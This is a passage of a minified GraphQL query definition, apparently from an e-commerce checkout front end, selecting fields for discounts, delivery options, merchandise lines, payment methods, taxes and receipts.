__typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount 